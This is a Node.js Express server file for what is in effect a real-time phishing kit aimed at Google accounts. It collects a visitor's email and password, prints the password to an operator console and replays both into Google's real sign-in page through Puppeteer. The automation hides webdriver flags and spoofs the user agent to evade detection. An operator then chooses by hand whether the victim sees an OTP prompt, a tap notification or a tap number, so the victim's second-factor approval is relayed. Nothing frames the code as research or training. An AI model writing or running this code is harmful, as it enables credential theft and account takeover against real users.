// backend/server.js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const readline = require('readline');
const path = require('path');
const os = require('os');
const puppeteer = require('puppeteer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// --- AUTH FLOW STATE ---
let currentUser = null;
let authState = 'standby';
let awaitingTapNumber = false;
let customTapNumber = 0;
let authTimeout = null;

// --- BROWSER AUTOMATION ---
let browser = null;
let activePage = null;
const AUTH_TIMEOUT = 5 * 60 * 1000; // 5 min

// --- READLINE FOR TERMINAL ---
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// --- MIDDLEWARE ---
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../frontend')));
app.use('/assets', express.static(path.join(__dirname, '../assets')));
app.use(session({
    secret: process.env.SESSION_SECRET || 'local-auth-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }
}));

// --- STATE LOGGING ---
function logState(message) {
    console.log(`[STATE_TRACE] ${new Date().toISOString()}: ${message} | currentUser: ${JSON.stringify(currentUser)}, authState: ${authState}, awaitingTapNumber: ${awaitingTapNumber}, customTapNumber: ${customTapNumber}`);
}

// --- RESET AUTH STATE ---
function resetAuthState() {
    logState('Resetting auth state');
    authState = 'standby';
    currentUser = null;
    awaitingTapNumber = false;
    customTapNumber = 0;
    if (authTimeout) { clearTimeout(authTimeout); authTimeout = null; }
    closeBrowser();
}

// --- AUTH TIMEOUT ---
function setAuthTimeout() {
    if (authTimeout) clearTimeout(authTimeout);
    authTimeout = setTimeout(resetAuthState, AUTH_TIMEOUT);
}

// --- BROWSER FUNCTIONS ---
async function launchBrowser() {
    if (browser) return;

    let userDataDir = process.env.CHROME_USER_DATA_DIR || path.join(os.homedir(), '.config/google-chrome');
    if (userDataDir.startsWith('~')) userDataDir = path.join(os.homedir(), userDataDir.slice(1));

    console.log('🚀 Launching browser with profile:', userDataDir);
    browser = await puppeteer.launch({
        headless: false,
        userDataDir,
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
        ignoreDefaultArgs: ['--enable-automation'],
        ignoreHTTPSErrors: true
    });
}

async function automateGoogleLogin(email, password) {
    try {
        await launchBrowser();
        activePage = await browser.newPage();
        await activePage.evaluateOnNewDocument(() => { Object.defineProperty(navigator, 'webdriver', { get: () => false }); });
        await activePage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36');

        await activePage.goto('https://accounts.google.com/signin/v2/identifier', { waitUntil: 'networkidle2', timeout: 30000 });
        await activePage.type('input[type="email"]', email, { delay: 100 });
        await activePage.click('#identifierNext');
        await activePage.waitForSelector('input[type="password"]', { timeout: 10000 });
        await activePage.type('input[type="password"]', password, { delay: 100 });
        await activePage.click('#passwordNext');

        console.log('✅ Google login automation completed, browser ready.');
        return { success: true };
    } catch (err) {
        console.error('❌ Google automation error:', err.message);
        resetAuthState();
        return { success: false, message: 'Google automation failed. Please check credentials and try again.' };
    }
}

async function closeBrowser() {
    if (browser) {
        console.log('🔒 Closing automated browser...');
        await browser.close();
        browser = null;
        activePage = null;
    }
}

// --- TERMINAL CONTROL ---
function showTerminalOptions(step, email = null, password = null) {
    console.log('\n' + '='.repeat(50));
    console.log(`👤 Current User: ${email || 'None'} | Step: ${step}`);
    if (password) console.log(`🔑 Password: ${password}`);
    console.log(`\nChoose frontend screen:`);
    console.log('1. OTP input | 2. Tap notification | 3. Tap number | 4. Complete auth | 5. Restart');
    console.log('Enter choice (1-5):');
}

function handleTerminalChoice(input) {
    if (awaitingTapNumber) {
        const num = parseInt(input.trim());
        if (isNaN(num) || num < 0 || num > 9) return console.log('⚠️ Enter a number 0-9:');
        customTapNumber = num;
        awaitingTapNumber = false;
        authState = 'show_tap_number';
        logState('Tap number set');
        console.log(`🔢 Tap number: ${customTapNumber}`);
        return;
    }

    switch(input.trim()) {
        case '1': authState='show_otp'; logState('authState->show_otp'); break;
        case '2': authState='show_device'; logState('authState->show_device'); break;
        case '3': awaitingTapNumber=true; logState('awaitingTapNumber=true'); console.log('Enter tap number:'); break;
        case '4': authState='auth_success'; logState('authState->auth_success'); break;
        case '5': console.log('🔄 Restarting login...'); resetAuthState(); break;
        default: console.log('⚠️ Invalid choice'); if (currentUser) showTerminalOptions('password_entered', currentUser.email, currentUser.password); else showTerminalOptions('username_entered'); return;
    }
}

// --- ROUTES ---
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'../frontend/index.html')));
app.get('/login', (req,res)=>res.sendFile(path.join(__dirname,'../frontend/login.html')));

app.post('/auth', async (req,res)=>{
    try {
        const {email, password, step='username'} = req.body;
        if(step!=='get_state') console.log('\n'+'='.repeat(50), '🔐 NEW AUTH');

        if(step==='username'){
            if(!email || typeof email!=='string' || email.length<5 || !email.includes('@')) return res.status(400).json({success:false,message:'Invalid email'});
            currentUser={email};
            logState('Email received');
            setAuthTimeout();
            return res.json({success:true,step:'username_processed',message:'Email processed. Enter password...'});
        }
        if(step==='password'){
            if(!password || typeof password!=='string') return res.status(400).json({success:false,message:'Provide password'});
            currentUser.password = password;
            logState('Password received');
            const result = await automateGoogleLogin(currentUser.email, currentUser.password);
            if (!result.success) {
                return res.status(400).json(result);
            }
            showTerminalOptions('password_entered', currentUser.email, password);
            return res.json({success:true,step:'password_processed',message:'Password processed. Awaiting manual control...'});
        }
        if(step==='get_state') return res.json({state:authState,number:authState==='show_tap_number'?customTapNumber:null});

        return res.status(400).json({success:false,message:'Invalid step'});
    } catch (error) {
        console.error('Auth error:', error);
        resetAuthState();
        return res.status(500).json({ success: false, message: 'An internal server error occurred.' });
    }
});

app.get('/check-session',(req,res)=>res.json(req.session.user?{loggedIn:true,user:req.session.user}:{loggedIn:false}));
app.get('/logout',(req,res)=>{ req.session.destroy(); authState='standby'; currentUser=null; closeBrowser(); res.redirect('/'); });

app.post('/complete-auth',(req,res)=>{
    try {
        if(authState==='auth_success' && currentUser){
            req.session.user = {email:currentUser.email,name:currentUser.email.split('@')[0],verified_email:true,auth_method:'manual_control',auth_time:Date.now(),local_auth:true};
            console.log('✅ Session created for',currentUser.email);
            resetAuthState();
            return res.json({success:true,message:'Auth completed!',user:req.session.user});
        }
        return res.status(400).json({success:false,message:'Auth not ready'});
    } catch (error) {
        console.error('Complete auth error:', error);
        resetAuthState();
        return res.status(500).json({ success: false, message: 'An internal server error occurred during auth completion.' });
    }
});

// --- TERMINAL LOOP ---
function startTerminalControl(){
    rl.setPrompt('');
    console.log('🚀 Manual Authentication Control Started');
    rl.on('line', input => handleTerminalChoice(input));
}

// --- CLEANUP ---
process.on('SIGINT', async ()=>{ console.log('\n🛑 Shutting down...'); await closeBrowser(); process.exit(0); });

// --- START SERVER ---
if(require.main===module){
    app.listen(PORT,()=>{ 
        console.log(`🚀 Server running at http://localhost:${PORT}`);
        startTerminalControl();
    });
}

module.exports = { app };
